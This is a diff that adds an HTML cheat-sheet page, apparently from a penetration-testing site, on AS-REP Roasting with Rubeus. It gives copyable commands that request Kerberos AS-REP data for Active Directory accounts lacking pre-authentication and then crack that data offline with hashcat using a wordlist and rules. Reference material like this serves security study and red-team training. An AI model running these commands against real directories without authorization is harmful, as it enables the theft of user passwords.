@@ -1,0 +1,49 @@
+<section class="page active prose-page">
+  <h1>Using Rubeus</h1>
+  <p class="intro">
+    Rubeus performs AS-REP Roasting by requesting AS-REP messages for Active Directory accounts with Kerberos
+    pre-authentication disabled. The returned Kerberos data can be cracked offline to recover user passwords.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Advantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Minimal network traffic and supports offline password cracking.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Disadvantages</h2>
+    <span></span>
+  </div>
+
+  <p class="content-text">
+    Requires Kerberos pre-authentication to be disabled and can still be detected.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Performing AS-REP Roasting From User</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">.\Rubeus.exe asreproast /nowrap</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Crack Session Key Use Hashcat</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
